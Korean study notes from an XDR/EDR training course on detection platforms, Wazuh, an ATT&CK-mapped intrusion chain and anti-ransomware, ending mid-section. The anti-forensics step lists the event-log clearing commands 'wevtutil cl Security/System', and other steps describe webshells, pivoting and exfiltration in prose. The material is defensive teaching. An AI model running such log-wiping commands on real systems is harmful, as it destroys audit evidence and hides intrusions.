# [수업 노트] 확장형 탐지 및 대응(XDR) — Wazuh 설정, 윈도우 이벤트 로그, HWP 악성코드 침투 분석

> 원본: 개인 학습 노트(Notion)에서 옮겨 정리. 스크린샷은 📷 표시로 화면 내용을 글로 옮겼습니다.

## 확장형 탐지 및 대응 솔루션 (XDR)-Day1

> 📷 구성도: SIEM(로그 수집·상관분석·알림·컴플라이언스)이 가장 바깥, 그 안에 XDR(엔드포인트+네트워크+클라우드 통합 탐지·대응), 그 안에 EDR(Windows/macOS 프로세스·파일·레지스트리, Linux 서버 시스콜·네트워크 연결, 모바일 앱 행위 + 자동 격리·프로세스 킬). XDR은 NDR(네트워크 트래픽), 클라우드 로그(AWS·Azure·GCP), 이메일 보안을 더하고, SIEM은 위협 인텔리전스·컴플라이언스 로그·장기 보존을 담당.

## XDR 교육 정리
> 2026-05-13 교육 수강 노트 | 보안 솔루션 개념 + 위협 생태계 + 실습 환경

### 1. 보안 솔루션 개념 정리

#### EDR (Endpoint Detection & Response)

엔드포인트(PC, 서버, 모바일)에 에이전트를 설치해 행위 기반으로 위협을 탐지하고 대응하는 솔루션.

수집 데이터

- 프로세스 생성 / 종료
- 파일 생성 / 변경 / 삭제
- 레지스트리 변경
- 네트워크 연결 (아웃바운드/인바운드)
- 시스콜 (Linux)

핵심 기능

- 실시간 행위 모니터링
- 이상 행위 탐지 (룰 기반 + ML)
- 자동 격리(Isolate), 프로세스 강제 종료(Kill)
- 포렌식용 타임라인 기록

대표 제품 — CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint, Wazuh (오픈소스)

#### XDR (Extended Detection & Response)

EDR을 확장해서 네트워크, 클라우드, 이메일, ID 시스템 등 여러 보안 데이터 소스를 단일 플랫폼에서 통합 분석·대응하는 솔루션.

EDR과의 차이점

XDR이 통합하는 소스

- NDR (Network Detection & Response) — 내부 트래픽 이상 탐지
- CASB — 클라우드 앱 접근 통제
- 이메일 보안 — 피싱, 악성 첨부파일
- IAM / IdP — 자격증명 이상 탐지

대표 제품 — Palo Alto Cortex XDR, CrowdStrike Falcon (XDR 모드), Microsoft Sentinel + Defender 통합

#### SIEM (Security Information & Event Management)

조직 전체 로그를 장기 수집·보존하면서 상관 규칙(Correlation Rule)으로 알림을 생성하고, 컴플라이언스·감사 리포팅을 담당하는 플랫폼.

핵심 기능

- 다양한 소스에서 로그 수집 (syslog, API, agent)
- 정규화(Normalization) — 포맷이 다른 로그를 통일
- 상관 분석 — 여러 이벤트를 묶어 공격 패턴 탐지
- 알림(Alert) 생성 및 티켓 연동
- 장기 보존 — 규정에 따라 수개월~수년

EDR/XDR과의 차이

- EDR/XDR은 실시간 탐지·대응 중심
- SIEM은 로그 분석·조사·보고 중심
- 실무에서는 SIEM + XDR을 연동해서 사용

대표 제품 — Splunk, Microsoft Sentinel, IBM QRadar, Wazuh (오픈소스)

#### 세 솔루션의 관계
```plain text
[ SIEM ]  ← 로그 수집 · 장기보존 · 컴플라이언스
    ↑
[ XDR ]   ← 멀티 소스 통합 탐지 · 대응
    ↑
[ EDR ]   ← 엔드포인트 행위 탐지 · 격리
```
> 요즘 상용 제품들은 세 가지를 하나로 묶어 "XDR 플랫폼"으로 판매하는 추세.

Wazuh는 오픈소스로 SIEM + EDR 기능을 동시에 제공하며, 공식적으로 "Open-source XDR and SIEM"을 표방함.

### 2. 위협 생태계 — 다크웹 & 공격 경제

#### 다크웹 거래 구조

특정 조직이나 실질하는 조직의 정보가 돈으로 거래되는 공간. 단순 데이터 판매를 넘어 공격 서비스 전체가 상품화되어 있음.

주요 거래 품목
> RaaS 구조 예시 — LockBit, BlackCat(ALPHV), Cl0p 등이 대표적. 개발자는 직접 공격에 참여하지 않고 플랫폼만 운영하므로 법적 추적이 어려움.

### 3. 공격 기법 — CVE 기반 침투 시나리오

#### 초기 침투 — CVE 취약점 악용

공개된 CVE를 이용해 외부 접근 가능한 시스템을 공략.

교육 사례 — 홈텍스 사용자 인증 사이트의 magic line 취약점

- 인증 우회 또는 원격 코드 실행(RCE)이 가능한 취약 지점
- 공개 취약점이므로 CVE 번호가 부여되고 PoC 코드가 다크웹에 유통됨

> 📷 다크웹 생태계 도식: 공급자(취약점 연구자의 CVE·제로데이, RaaS 개발자, Access Broker의 내부망 접근권한, 자격증명 덤프)가 다크웹 마켓에서 암호화폐로 거래 → 구매자(피싱·익스플로잇 Kit 구매자, RaaS Affiliate, 내부망 침투자, 크리덴셜 스터퍼)가 피해 조직을 공격하고, 탈취 데이터는 다시 재판매된다.

#### 공격 체인 단계별 분석

① 초기 침투 (Initial Access)

- 공개된 CVE를 이용해 외부 접근 가능한 시스템 공략
- 교육 사례: 홈텍스 사용자 인증 사이트의 magic line 취약점 — 인증 우회 또는 원격 코드 실행(RCE) 가능
- 공개 취약점이므로 CVE 번호가 부여되고 PoC 코드가 다크웹에 유통됨

② 방어 우회 (Defense Evasion)

- 정상 소프트웨어처럼 보이는 악성 파일 배포
- AV/EDR 시그니처 탐지를 우회하기 위해 정상 프로세스에 인젝션하거나 서명된 바이너리를 악용
- Living off the Land(LotL) — certutil, powershell, mshta 등 OS 내장 도구 활용으로 탐지 회피

③ 거점 확보 (Persistence) — Staging Server + Webshell

- 공격자가 중간 스테이징 서버를 별도 구축
- 보안 솔루션이 신뢰하는 경로(보안 소프트웨어 업데이트 채널 등)를 통해 웹쉘 업로드
- 웹쉘은 서버에 지속적인 원격 접근 거점 확보 수단
- 탐지 회피를 위해 정상 웹 디렉터리에 숨기거나 파일명을 정상 파일처럼 위장

④ 피벗 서버 추가 구축 (Lateral Movement / C2) ← 추가

- 공격자 IP가 피해 조직에 직접 닿지 않도록 별도 서버를 중간에 추가 생성
- 피해자 입장에서는 트래픽 출처가 "중간 서버"로만 보임 → 공격자 IP 역추적 차단
- 중간 서버를 통해 WebSocket으로 내부망 데이터를 외부로 릴레이
- 일반 HTTPS 트래픽(443 포트)처럼 보여 방화벽·DPI 탐지 우회
- 임무 완료 후 중간 서버를 폐기하면 추적 흔적이 끊김
> 핵심 포인트 — 서버를 하나 더 만드는 이유는 단순 우회가 아니라, 사후 포렌식에서 공격자 실제 인프라가 드러나지 않게 하는 귀인(Attribution) 방해 목적

⑤ 데이터 탈취 (Exfiltration)

- 탈취한 자격증명, 내부 자산 목록, 기밀 문서를 외부로 전송
- WebSocket C2 채널을 통해 암호화된 상태로 유출
- 방화벽이 443 포트를 허용하는 환경에서 특히 유효

⑥ 흔적 삭제 (Defense Evasion / Anti-Forensics) ← 추가

- 탈취 완료 후 페이크 설치파일에 심어뒀던 DLL을 삭제
- 악성 파일 자체를 제거함으로써 포렌식 분석 시 악성 코드 존재 증거를 소멸
- 함께 수행하는 작업:
  - 이벤트 로그 삭제 (wevtutil cl Security, wevtutil cl System)
  - Prefetch 파일 삭제 (실행 이력 제거)
  - 레지스트리 Run 키 정리 (자동실행 흔적 제거)
- EDR이 파일 삭제 이벤트(Sysmon EventID 23/26)를 실시간으로 기록해두지 않으면 사후 증거가 남지 않음
> 탐지 포인트 — 삭제 행위 자체가 탐지 대상. 정상적인 설치파일이 DLL을 스스로 삭제하는 경우는 거의 없으므로 해당 패턴이 탐지 룰의 트리거가 됨

⑦ 다크웹 재판매 / 2차 공격 (Monetization)

- 탈취한 자격증명·내부 자산 목록을 다크웹에서 판매
- 또는 2차 공격(내부 횡이동, 추가 랜섬웨어 배포)에 재활용
- Access Broker 역할로 전환해 내부망 접근권한 자체를 경매에 올리기도 함

> 📷 공격 단계와 ATT&CK 매핑: ① 초기 침투(CVE 악용, T1190) ② 방어 우회(보안 프로그램 위장·LotL, T1036) ③ 거점 확보(스테이징 서버·웹셸, T1505.003) ④ 피벗 서버 구축(공격자 IP 은닉, WebSocket 릴레이, T1090/T1071) ⑤ 데이터 탈취(C2 채널 유출, T1041) ⑥ 흔적 삭제(가짜 설치 파일 DLL·로그 제거, T1070/T1574) ⑦ 다크웹 재판매·2차 공격.

#### ATT&CK 프레임워크 매핑

### 4. 실습 환경 구성

#### 가상머신 구성

#### WebSrv 상태 메모

- OS: Ubuntu 22.04.5 LTS (Linux 5.15.0-133-generic)
- 디스크 사용률 58%, 메모리 59% 사용 중
- 커널 경고 발생:

→ VM 리소스 부족 또는 디스크 I/O 병목. 실습 중 VM hang이 발생하면 강사에게 재시작 요청.
```plain text
task kcompactd0 blocked for more than 120 secondstask jbd2/dm-0-8 blocked for more than 120 seconds
```

### 5. Open XDR vs Native XDR — 국내 시장 맥락

#### 두 모델의 차이

#### 국내 시장의 현실

국내에는 이미 다양한 보안 솔루션이 도입되어 있음. Native XDR 벤더가 들어오면 기존에 사용하던 솔루션을 버려야 하는 문제가 발생.

- 계약·유지보수 기간이 남아있는 솔루션의 중도 교체 비용
- 조직 내 벤더 다양화 정책과 충돌
- 특정 벤더 의존도 심화에 대한 보안팀의 거부감

→ 결과적으로 국내에서는 Open XDR 또는 SIEM 중심의 통합 구조가 현실적으로 더 많이 채택됨.

#### XDR 업계 트렌드 변화 — 화두의 이동

XDR이 등장한 이후 업계의 핵심 관심사는 시대에 따라 뚜렷하게 변화해왔음.

#### 1세대 — API 확장성 (Open XDR 시대)

XDR을 도입하려면 다양한 소스의 데이터가 필요 → 이를 위해 API 연동이 핵심 경쟁력이었음.

- "얼마나 많은 서드파티 솔루션과 연결할 수 있는가"가 제품 평가 기준
- 방화벽, IPS, 이메일 보안, 클라우드 로그 등 이기종 솔루션을 API로 묶는 Open XDR이 주류
- SIEM 벤더들도 커넥터(Connector) 수를 경쟁적으로 늘림

#### 2세대 — Native XDR 중심 (Palo Alto 등 단일 벤더 플랫폼)

API 기반 통합의 한계(복잡도, 품질 편차, 유지보수 비용) 인식 → 단일 벤더 네이티브 통합으로 무게중심 이동.

- Palo Alto Cortex XDR이 대표 사례 — 자사 NGFW·Prisma·Cortex를 하나로 묶어 긴밀한 상관분석 제공
- 통합 품질과 UX가 높지만, 기존 솔루션 교체 강제라는 국내 시장 저항에 부딪힘
- CrowdStrike, Microsoft(Defender XDR)도 같은 방향으로 진화

#### 3세대 화두 — IAM + AI

최근 업계의 관심이 두 방향으로 수렴되고 있음.

IAM (Identity and Access Management)

- 공격자들이 자격증명 탈취 → 정상 계정으로 이동하는 패턴(LotL과 결합)이 급증
- 네트워크·엔드포인트 탐지만으로는 한계 → "누가 접근하는가" 라는 ID 레이어 탐지가 필수
- Okta, Azure AD 등 IdP 로그를 XDR에 통합하는 것이 표준 구성으로 자리잡는 중
- ITDR(Identity Threat Detection & Response)이라는 별도 카테고리로 분화되기도 함

AI / ML 기반 탐지

- 룰 기반 탐지의 한계(LotL처럼 정상 도구를 악용하면 시그니처로 잡히지 않음)를 AI로 보완
- 행위 기준선(Baseline)을 학습해 비정상 패턴 자동 탐지
- AI가 Alert 우선순위를 자동 분류 → SOC 분석가의 Alert Fatigue 완화
- SIEM/XDR 벤더들이 앞다퉈 AI 코파일럿(Copilot) 기능을 탑재 중

#### LotL과 RaaS — 탐지를 어렵게 만드는 두 가지 화두

LotL (Living off the Land)

악성 코드를 별도로 심지 않고, OS에 이미 존재하는 정상 도구를 악용해 공격하는 기법.

- powershell.exe, certutil.exe, wmic.exe, mshta.exe 등 Microsoft 서명된 바이너리 활용
- AV/EDR의 시그니처 탐지를 원천 우회 — 악성 파일 자체가 없으니 탐지 기준이 없음
- 탐지하려면 행위 기반(Behavioral) 분석 필수 — "정상 도구가 비정상적인 맥락에서 실행됨"을 잡아야 함
- XDR이 주목받는 이유 중 하나 — 엔드포인트 단독으로는 판단이 어렵고, 네트워크·클라우드·ID 컨텍스트를 함께 봐야 LotL을 확신할 수 있음

RaaS (Ransomware-as-a-Service) — 서비스화된 위협

- 랜섬웨어 자체가 상품화되어 기술 없이도 공격 가능 → 공격자 모수가 폭발적으로 증가
- LotL + RaaS 조합이 최근 침해 사고의 전형적 패턴
  1. RaaS affiliate가 Kit 구매
  1. LotL 기법으로 내부 침투 (탐지 회피)
  1. 내부 이동 후 랜섬웨어 배포
- XDR은 이 전체 체인을 단일 뷰로 추적하는 것이 목표

#### EDR 벤더의 백신 연계 전략 — 락인 구조 이해

EDR 회사들은 자사 백신(AV)과 연계해서 탐지를 강화하는 방식을 취함.

- 파일 정보(해시, 메타데이터)를 긁어오는 것 자체는 어떤 탐지 솔루션이든 에이전트만 깔면 EDR 기능이 가능
- 그러나 EDR 벤더들은 자사 PIP(플랫폼 내 생태계)에서만 완전 동작하도록 설계
- 타사 AV와 공존 시 기능 제한, 충돌, 성능 저하 유도 → 결국 자사 백신으로 교체 압박
> 핵심 인사이트 — EDR 도입 = 백신 교체까지 이어지는 구조. 단품 도입이 아닌 플랫폼 전환임을 인식해야 함.

### 6. SIEM의 역할 확장 — 데이터 레이크

#### SIEM = 보안 데이터 레이크

현대 SIEM은 단순 로그 수집·알림을 넘어 보안 데이터 레이크(Security Data Lake) 역할을 수행.

- 엔드포인트, 네트워크, 클라우드, 애플리케이션 로그를 한 곳에 집적
- 정규화된 데이터를 다양한 분석 도구(UEBA, TI, SOAR)가 소비
- 장기 보존 데이터를 기반으로 침해 사후 조사(Forensic Investigation) 가능

국내 사례 — 이글루시큐리티

- 국내 대표 SIEM 벤더
- SPiDER TM 플랫폼이 데이터 레이크 역할 수행
- 다양한 국내 보안 솔루션과의 연동 커넥터를 보유해 Open XDR 구조에 적합

### 7. SOAR와 XSOAR — 자동화 대응의 현실

#### SOAR (Security Orchestration, Automation and Response)

보안 알림에 대한 대응 프로세스를 자동화하는 플랫폼. 플레이북(Playbook)을 만들어 반복적인 대응 작업을 자동 실행.

플레이북 예시
```plain text
[Alert] 악성 IP 접속 탐지
    → IP 자동 차단 (방화벽 API 호출)
    → 해당 계정 임시 잠금 (AD API)
    → 티켓 생성 (Jira/ServiceNow)
    → 담당자 Slack 알림
```

SOAR의 현실적 한계

- 플레이북 개발에 개발자가 필요 — Python/JS 등 코딩 필요
- 그런데 개발자는 보안을 잘 모름 → 보안 맥락이 빠진 자동화 스크립트가 만들어짐
- 보안 담당자는 코딩을 모름 → 플레이북 유지보수가 안 됨
- 결국 고비용 구축 후 제대로 활용 못하는 사례 다수 발생
> 해결 방향 — Low-code/No-code SOAR 플랫폼 또는 보안 엔지니어링 역량을 갖춘 인력 확보. 최근에는 AI가 플레이북 초안을 생성해주는 방향으로 발전 중.

#### XSOAR (Extended SOAR)

Palo Alto Networks의 Cortex XSOAR가 대표적. SOAR에 케이스 관리, TI 연동, 멀티테넌트 지원을 추가한 확장 버전. SIEM 벤더들도 자체 SOAR 기능을 통합하는 추세 (→ SIEM + SOAR 융합).

### 8. XDR 품질의 핵심 — EDR이 결정한다

#### "좋은 XDR은 좋은 EDR에 달려있다"
> 행위는 어쨌든 엔드포인트에서 발생한다. 뚫고 들어온 기록은 거기에 다 남아있다.

공격자가 네트워크를 통해 진입하더라도, 실제 악성 행위(프로세스 실행, 파일 생성, 레지스트리 변경, 내부 이동)는 결국 엔드포인트에서 일어남. XDR이 아무리 다양한 소스를 통합해도, 엔드포인트 데이터의 품질이 낮으면 전체 탐지 품질이 낮아짐.

#### 좋은 EDR의 조건

- 최대한 많은 정보를 수집 — 프로세스 트리, 파일 해시, 네트워크 연결, 메모리 상태, 부모-자식 프로세스 관계
- 노이즈 없이 정확하게 — 오탐(False Positive)이 많으면 SOC 분석가가 피로해져 실제 위협을 놓침
- 깔끔한 시각화 — 공격 타임라인, 프로세스 트리, Kill Chain 상의 위치를 직관적으로 보여줌
- 빠른 텔레메트리 전송 — 실시간에 가깝게 데이터가 SIEM/XDR로 올라와야 즉각 대응 가능

#### EDR 품질이 XDR 전체에 미치는 영향
```plain text
[EDR 품질 높음]
  → 엔드포인트 텔레메트리 풍부
  → XDR 상관분석 정확도 상승
  → SOAR 플레이북 트리거 신뢰도 상승
  → SOC 분석가 업무 효율 상승

[EDR 품질 낮음]
  → 수집 데이터 누락 or 과다 노이즈
  → XDR 상관분석 오탐 증가
  → 플레이북 오동작
  → Alert Fatigue → 실제 위협 미탐
```
> 결론 — XDR 플랫폼을 선택할 때 화려한 대시보드보다 에이전트(EDR)가 얼마나 깊고 정확하게 엔드포인트를 관찰하는지를 먼저 평가해야 함.

### 9. 참고 — Wazuh 포지션 정리
> Wazuh는 엄밀히는 SIEM + EDR에 가깝지만, 멀티 소스 통합 구성이 가능하므로 학습·홈랩·중소규모 환경에서 XDR 역할로 활용 가능.
```text
xdr seim edr 이 80%
```

sgi 서울 보증보험

edr은 사용자 서버 중심으로 설치를 했다.

사용자 단말을 보고 탐지하는 것에 대한 한계를 보고. 서버 중심으로 탐지하기 시작함

<문제점>

다크웹 - 특정 조직이나 실질하는 조직의 정보가 돈으로 거래된다.
```text
kit 
raas affillate 
```

소프트웨어 취약점  - CVE magic line - 홈텍스 사용자 인증 사이트

- 보안프로그램인척
- staging server ↔security software  webshell
- 서버를 하나더 만들어서  다른 서버로 데이터 던진 다음 (websocket) injection code해서 ..

LotL living off the land - 정상적인 작동에서 보안 솔루션 감지는 하지말자.

iocs 잘알려진 파일기반처럼 것에대한 탐지 하지만 우회를 하기 때문에 ioas 행위기반으로 가야한다.

watering hole 공격 시작 - 업무포탈에 security sofware insatller - fake secruty softwware 이 설치되면서 rundll.exe  ‘

credential 탈취이후 지우고 정상적인 프로그램만 남도록한다.

어떤일이 발생했을때 chain tree 를확인하고 행위기반으로 탐지

특정 사이트의 로그인 정보는 특정 소프트워어만 접근해야하지만 ,fakesoftware이 접근을 하면 edr이 탐지를 한다.

rootcause를 알아낸다.

네트워크 기반의 솔루션으로는 부족하다.

#### XDR

NDR 이전에 NDT 등 다른 것들도 있음

NDR network detection and response+ EDR endpoint detection response

RSA - 정보보안 컨퍼런스 - Stronger together #XDR

개념의 변화 - 모든 보안 솔루션이 다 대상이되고 이 데이터를 정제화하는 솔루션이 XDR이다.

하나의 DATELAKE에 던지기전에 데이터를 정규화한다. 파싱

DATELAKE에 있는 정규화된 정보를 상관관계 분석

RESPONSE

X의 해석의 다름 확대/ 연동/ 변수

Open XDR VS Native XDR

우리나라의 경우 많은 솔루션이 있는데 Native 솔루션을 제공하면 이전에 사용하고 있던 것을 사용못함

SEIM - 데이터 레이크 역활을 해준다.  이글루의 경우

백신 - EDR회사의 경우 백신과 연계를 해서 탐지를 하기때문에

파일정보를 긁어온다는 것은 탐지 솔루션을 장착하면 EDR가능하지만 자신의 PIP만 가능하게함

XDR 의 경우 together 정신이라서 많은 장점이 있다.

SOA - 플레이북을 만들어야한다. 개발자가 항상 필요 하지만 보안을 잘모름

XOAL - SEIM 업체들이 …

행위는 어쨌던 엔드포인트에서 발생한다. 뚫고 들어온 기록은 거기에 다 남아있다.

xdr은 좋은 edr에 달렸고 좋은 edr은 최대한 정보를 다 제공해 깔끔하게 시각화 도와준다.


## EDR

wazuh

파일리스

공격자는 한 번에 공격못함

원하는 공격 코드 익젝션 후 피해자가 접속 후 파일로 떨어지면 탐지되므로 process injection이라는 기법을 사용

근데 일반 정상적인 파일은 파일 자체만 본다. 그래서 행위는 보지 않는다.

edr은 파일의 행위를 본다.

edr과 xdr의 레거시한 것들 상이의 차이점

바이든 행정명령 14028 \ 미연방정부 기관들 edr시스템 구축 명령

edr을 설치를 compliance 만든것

톻합로그 관제

우리나라도 올해는 금융권 내년에은 공공기관에 의무화됨

랜섬웨어를 대비한것으로.. 그래서 랜섬전용 솔루션만 도입

cctv

백신은 탐지 삭제

edr은 모든 자료 수집

탐지 엔진이 들어감  edr은 행위기반 탐지를 받드시해야함 백신과달리

분석 가시성있게 보고 동일 프로세스의 반복을 막기위해  백신은 삭제와 발견ㄴ

대응

ㅜㅅ집단계

파일 프로ㅔ스 모듈 네트워크 레지스터리 , 윈도우 이벤트 - 어떤 일이 있었다는 것 기록 앞으것이이를 위해 필요

리지스터리 밸류 delete key createjet dlelteket renamekey..

탐지

당ㅇ야한 알지 벤더서의 기술과 판단 일를 모듈화시킬수도 있다.

av탐지를 빼기도함 백신이있으면

ioc탐지 - 침해지표 ㅎ시 파일 정보

머신러닝 팬턴학습

eco 평판 유사도 벤더사들의 교ㅗ우ㅠ의값 ti일 수도 이싿.

av 탐지에서 백신과 edr이 연동되어야 편함

행위기반 - 행위판단의 근거가 있어야함 사업 성격에 따라도다름

글로벌 표준으로 뼈대를 만듦 mitre tt#ck 직무소개에 따라 커스텀하고 룰을 만듦

와주는 룰베이스 탐지 글로벌 룰 조차도 커스텀화해서 쓰는 룰 텍스트 기반의 룰

대응

백신은 파일 격리 삭제

라이선스 크랙킹

apt 빨아먹은 느낌 - 네트워크를 돌아다니면서 빨아먹기때문에 막아야함

프로세스 종료 - 기업의 목적인 서비스가 안끊어지고 컴프라이언스를 지키기 위해

edr이 만약에 없으면 감염이 되면 모든 서버를 다 확인해야한다.

커리문을 프로세스 네임으로 만들어서.. 원격으로 메가데이터 등을 수집할 수 있다. edr서버는 한국 - 에이전트 서버는 외국 대한민국 외교부

포렌식 툴 사용도 가능

구성

온프레미스 형태의 server farm 퍼블릭 클라우드는 아직 위험하다.

edr은 분석 서버 소프트형태의 에이전트도 서버에 설치되어야한다.

에인전트리스도 있음 tcp레벨에서 2단계에서 움직이면 패킷에 있는 경우 에이전트리스로 가져올 수 있음

국보연 - 기술리서치 함정 잠수정에 edr설치 탐지를 위한 다양한 지표들은 백신 같은거는 데일리로 패치해야하는데 시스템의 수준이 낮아서 에이전트리스 형태의 edr로 구현요구nnc는 tcp로 쏘는거지만 아직 방법이 없음

좋은 edr의 1번은 좋은 agnet 충돌하지말고 가볍게 만들어라. 백신은 스스로 모든것을 다하기때문에 무거움 하지만 edr은 하는 역활이 더 넓어서 그냥 수집만하고 edr서버에서 모든 분석을 한다.

agent는

윈도우 하면 되었지만 최근에 리눅스는 종류가 많음.. 그래서 다 지원하지는 않는다.   커널레벨에서 탐지하는 것은 공통이지만 작동방법이 다르다. eBPF는 훨씬 낫다. 하지만 모든 리눅스의 버전에서 지원되지는 않느낟.

CPU메모리 덜쓰고

다른 솔루션과의 호환성

문서중앙화 ㅁ에체제어 DLP NAC 개인정보보호 SSO통합인증 PMS 데이터 복우너 ㅡㅍ린터보안 ㅔㅁ시넞 소프트웨어 관리 - 11개 에이전트 무거운

DRM 파일을 암호화시켜 보안을 강화하지만 이것은 랜썸웨어와행위가 비슷함

EDR

AI / 담당자의 MANPOWER가 필요함 EDR의 경우/ 그래서 AI의 도움으로 사람의 노력을 줄여야함

긁어온 정보를 클ㄹ우드 ECISYSTME에서 분석해 다른 회사에도 응용함

백신이라도 CHAIN TREE가 나와서 하나의 위협만 탐지가 되면 분석이 가능해서 격리 처리가 가능함

백션 엔지ㅏ탐지 이벤트 - EDR이 있어서 쉽게 해결이됨

Anti Ransom 랜섬웨어의 shame ware의 특성에 맞는 대응이 피료

volume shadow 기능을 이용 win8 부터, 롤벡기능 vss 에이전트의 스케쥴 백업기능을 이용해 주기적으로 스냅샷을 찌고 저장공간도 관리

락빗의 경우 최신과 기긴이 길면 유실가능성

anti ransom 실시간 복구 백업.. 실시간 인지 트리거는 임계치를 정하고io를 보고 판단한다. 메타데이터등을 위해서 실시간 백업본만들고 .. wazuh가 만드느 apt 블랙바스터 랜섬웨어를 이용한 시실시간 대응 영상. 랜섬웨어 동작 후 백업 암호화된 무서 지우기

ㅅ그리고 백업


## 

soar - siem 이라고 보고 플레이북도 만들고..


## EDR 심화 교육 노트-Day1
> 2026-05-13 교육 수강 노트 | EDR 동작 원리 · 탐지 구조 · 구성 · Anti-Ransomware

### 1. 왜 EDR이 필요한가 — 백신의 한계

공격자는 한 번에 공격하지 않는다.

원하는 악성 코드를 바로 파일로 떨어뜨리면 백신에 탐지되므로, 정상 프로세스에 코드를 주입하는 Process Injection 기법을 사용.

- 피해자가 악성 링크 접속 → 파일 없이 메모리에 코드 로드 → 파일리스(Fileless) 공격
- 백신은 파일 자체만 검사하므로 탐지 불가
- EDR은 파일의 행위를 보기 때문에 파일리스 공격도 탐지 가능

#### 백신 vs EDR 비교
> 백신은 발견·삭제. EDR은 수집·분석·탐지·대응·가시성 전체.

### 2. 컴플라이언스 — EDR 의무화 흐름

#### 미국 — 바이든 행정명령 14028 (2021)

- 미 연방정부 기관 전체에 EDR 시스템 구축 명령
- 랜섬웨어 급증에 대한 국가 차원의 대응
- EDR 도입을 컴플라이언스로 만든 첫 사례 → 글로벌 표준화 계기

#### 한국 — 단계적 의무화

- 금융권 — 2026년 의무화
- 공공기관 — 2027년 의무화
- 배경: 랜섬웨어 대비 목적 → 초기에는 랜섬웨어 전용 솔루션만 도입하는 경우도 있었으나, 통합 EDR/XDR 방향으로 수렴 중
- 통합로그관제(SIEM)와 함께 이중 의무화 구조

### 3. EDR 수집 데이터 — 5대 영역

EDR 에이전트가 수집하는 핵심 데이터 영역. 이 데이터들이 탐지 엔진의 원재료.
> Windows 이벤트 로그 — "어떤 일이 있었다"는 기록. 위 5개 영역의 수집이 선행되어야 이벤트 로그와 연계해 의미있는 분석이 가능.

### 4. EDR 탐지 엔진 — 다층 탐지 구조

EDR은 단일 탐지 방식이 아닌 여러 탐지 모듈을 레이어로 쌓는 구조.

#### ① AV 탐지 (시그니처)

- 백신 엔진과 연동 — 백신이 이미 있는 환경에서는 이 모듈을 빼기도 함
- 알려진 악성 파일 해시(IOC) 매칭

#### ② IOC 탐지 (침해지표)

- 파일 해시·IP·도메인·URL 등 침해 지표 기반 탐지
- TI(Threat Intelligence) 피드와 연동해 최신 IOC 실시간 업데이트

#### ③ 머신러닝 / 패턴 학습

- 정상 행위 기준선(Baseline)을 학습
- 기준선에서 벗어난 이상 행위 탐지
- 알려지지 않은 공격(Zero-day)에도 대응 가능

#### ④ 평판 / 유사도 (ECO)

- 벤더사들 간 공유된 위협 정보(TI) 활용
- 파일·프로세스의 평판 점수 기반 위험도 판단
- 글로벌 클라우드 생태계에서 수집된 데이터로 타사 침해 사례도 반영
- TI 피드 형태로 연동 가능

#### ⑤ 행위 기반 탐지 ← EDR의 핵심

- 반드시 포함되어야 하는 탐지 방식 — 백신과 구분되는 핵심 요소
- 행위 판단의 근거: MITRE ATT&CK 프레임워크를 뼈대로 룰 설계
- 사업 성격·환경에 따라 커스텀 룰 추가
- 동일 프로세스의 반복을 감지해 자동화 공격 차단
> Wazuh — 룰베이스 탐지 중심. 글로벌 룰도 환경에 맞게 커스텀해서 사용. 텍스트 기반 룰 파일로 관리. 벤더사 기술과 판단을 모듈화해 적용 가능.

### 5. EDR 대응 기능

백신은 파일 격리·삭제가 전부. EDR은 훨씬 정교하게 대응.

### 6. EDR 구성 — 아키텍처

#### 기본 구성
```plain text
[ 엔드포인트 ] ← 에이전트(Agent) 설치 (수집만 담당)
      ↓ 수집 데이터 전송
[ EDR 분석 서버 ] ← 모든 분석·탐지는 서버에서 수행
      ↓
[ 콘솔 / 대시보드 ] ← SOC 분석가 화면
```

- 에이전트는 수집만 담당 → 가볍게 유지 가능
- 분석·탐지 등 무거운 작업은 서버에서 처리
- 온프레미스 Server Farm 형태가 기본. 퍼블릭 클라우드는 아직 보안상 리스크 있음

#### 에이전트리스(Agentless)

모든 엔드포인트에 에이전트를 설치하기 어려운 환경을 위한 대안.

- TCP 레벨(L2)에서 패킷을 수집해 에이전트 없이 탐지
- 국보연(국방과학연구소) 사례 — 함정·잠수정처럼 시스템 수준이 낮거나 에이전트 설치가 불가한 환경
  - 백신처럼 데일리 패치가 필요한 구조는 불가
  - NNC는 TCP로 데이터를 송신하는 방식이지만 아직 완전한 해법은 없음
  - 에이전트리스 형태의 EDR로 구현 요구 중

### 7. 좋은 EDR의 조건 — 에이전트 품질이 핵심
> "좋은 EDR의 1번 조건은 좋은 에이전트다 — 충돌하지 말고, 가볍게 만들어라."

#### 에이전트 품질 기준

- 가벼울 것 — CPU·메모리 사용 최소화. 수집만 하고 분석은 서버에 위임
- 충돌 없을 것 — 다른 보안 솔루션과 공존 가능
- 다양한 OS 지원 — Windows는 기본. Linux는 배포판이 많아 전부 지원하기 어려움

#### Linux 에이전트 이슈

- 커널 레벨 탐지는 공통이지만 작동 방식이 배포판마다 다름
- eBPF(Extended Berkeley Packet Filter) — 최신 방식으로 훨씬 효율적이나 구버전 Linux 커널에서는 미지원
- 배포판·커널 버전에 따른 호환성 테스트 필수

#### 에이전트 충돌 문제 — 11개 에이전트의 현실

현대 기업 보안 환경에서 단말 하나에 설치되는 에이전트:
```plain text
문서중앙화 / 매체제어 / DLP / NAC / 개인정보보호 /
SSO 통합인증 / PMS / 데이터복원 / 프린터보안 / 엠씨넥스트 / 소프트웨어관리
```

→ 여기에 EDR 에이전트까지 추가하면 충돌·성능 저하 위험 증가. EDR 선택 시 기존 에이전트와의 호환성 테스트 필수.
> DRM 주의 — DRM(파일 암호화)의 행위가 랜섬웨어와 유사. EDR이 DRM 동작을 랜섬웨어로 오탐할 수 있어 예외 처리(화이트리스트) 필요.

### 8. EDR과 AI — 사람의 한계를 보완

EDR에는 AI + 담당자 맨파워가 필요

EDR이 수집하는 데이터양은 방대 → 사람이 모두 분석하는 것은 불가. AI가 필수.

- 에이전트가 긁어온 정보를 클라우드 생태계(Ecosystem) 에서 분석
- 분석 결과를 다른 고객사에도 즉시 적용 → 한 곳의 침해 탐지가 전체 고객 보호로 이어짐
- SOC 분석가의 Alert Fatigue 완화가 AI 도입의 핵심 목표

#### 체인트리(Chain Tree)와 가시성

- 백신도 Chain Tree(프로세스 실행 계보 시각화)를 제공하기 시작
- 하나의 위협이 탐지되면 관련 프로세스 전체를 트리로 시각화 → 격리 처리 판단 가능
- EDR이 있으면 백신 탐지 이벤트도 풍부한 컨텍스트로 분석 가능

### 9. Anti-Ransomware — 랜섬웨어 전용 대응

#### 랜섬웨어의 특성

- 파일을 대량으로 빠르게 암호화 (Shameware 특성)
